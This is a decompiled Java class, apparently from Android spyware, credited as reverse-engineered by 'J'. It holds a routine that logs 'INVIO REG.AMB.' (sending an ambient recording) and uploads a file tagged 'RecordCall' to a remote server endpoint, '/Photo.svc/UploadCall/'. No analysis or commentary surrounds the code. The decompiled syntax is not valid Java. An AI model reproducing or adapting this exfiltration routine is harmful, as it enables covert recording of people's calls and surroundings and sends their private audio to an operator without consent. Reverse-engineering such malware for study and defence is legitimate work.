package com.app.system.common.d.a;

import android.content.Context;
import com.app.system.common.h;
import java.io.File;
import okhttp3.Response;
import okhttp3.ResponseBody;

public class o
  extends a
{
  public o(String paramString1, String paramString2)
  {
    super(paramString1, paramString2);
  }
  
  public int a(Context paramContext, String paramString, File paramFile)
  {
    try
    {
      StringBuilder localStringBuilder = new java/lang/StringBuilder;
      localStringBuilder.<init>();
      localStringBuilder.append("INVIO REG.AMB. ");
      localStringBuilder.append(paramString);
      h.a(paramContext, localStringBuilder.toString());
      if (this.b)
      {
        paramContext = new java/lang/StringBuilder;
        paramContext.<init>();
        paramContext.append(this.c);
        paramContext.append("/Photo.svc");
        paramContext.append("/UploadCall");
        paramContext.append("/");
        paramContext.append(paramString);
        paramContext = com.app.system.common.d.a.a.a.b(paramContext.toString(), paramFile);
      }
      else
      {
        paramContext = new java/lang/StringBuilder;
        paramContext.<init>();
        paramContext.append(this.c);
        paramContext.append("/Photo.svc");
        paramContext.append("/UploadCall");
        paramContext.append("/");
        paramContext.append(paramString);
        paramContext = com.app.system.common.d.a.a.a.b(paramContext.toString(), paramFile);
      }
      if ((paramContext != null) && (!paramContext.equals("")))
      {
        paramString = paramContext.body().string();
        paramContext = new java/lang/StringBuilder;
        paramContext.<init>();
        paramContext.append("SendPhoto Result: ");
        paramContext.append(paramString);
        com.security.d.a.d("RecordCall", paramContext.toString(), new Object[0]);
        boolean bool = paramString.startsWith("0");
        if (bool) {
          return 0;
        }
        return -20;
      }
      return -10;
    }
    catch (Exception paramContext)
    {
      com.security.d.a.a("RecordCall", paramContext.getMessage(), new Object[0]);
    }
    return 0;
  }
}


/* Location:              ~/com/app/system/common/d/a/o.class
 *
 * Reversed by:           J
 */